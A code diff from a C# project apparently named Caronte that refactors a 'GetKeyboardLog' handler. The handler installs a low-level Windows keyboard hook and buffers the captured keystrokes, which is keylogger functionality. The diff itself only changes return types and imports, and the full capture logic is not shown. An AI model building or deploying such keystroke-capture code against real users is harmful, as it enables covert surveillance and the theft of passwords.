@@ -1,10 +1,8 @@
-﻿using MediatR;
+﻿using CaronteLib.Response;
+using MediatR;
 using System;
-using System.Collections.Generic;
 using System.Diagnostics;
 using System.IO;
-using System.Linq;
-using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
@@ -14,7 +12,7 @@ using System.Windows.Forms;
 
 namespace Caronte.Modules.Information.GetKeyboardLog
 {
-    public class GetKeyboardLogQueryHandler : IRequest<CommomMediatorResponses>Handler<GetKeyboardLogQuery>
+    public class GetKeyboardLogQueryHandler : IRequestHandler<GetKeyboardLogQuery, CommomMediatorResponse>
     {
         private StringBuilder buffer;
         private readonly string desktopPath;
@@ -51,7 +49,7 @@ namespace Caronte.Modules.Information.GetKeyboardLog
             buffer = new StringBuilder();
         }
 
-        public Task<Unit> Handle(GetKeyboardLogQuery request, CancellationToken cancellationToken)
+        public Task<CommomMediatorResponse> Handle(GetKeyboardLogQuery request, CancellationToken cancellationToken)
         {
             _proc = HookCallback;
             hookId = SetHook(_proc);
@@ -64,7 +62,7 @@ namespace Caronte.Modules.Information.GetKeyboardLog
 
             inactivityTimer.Stop();
 
-            return Task.FromResult(Unit.Value);
+            return Task.FromResult(new CommomMediatorResponse());
         }
 
         private IntPtr SetHook(LowLevelKeyboardProc proc)
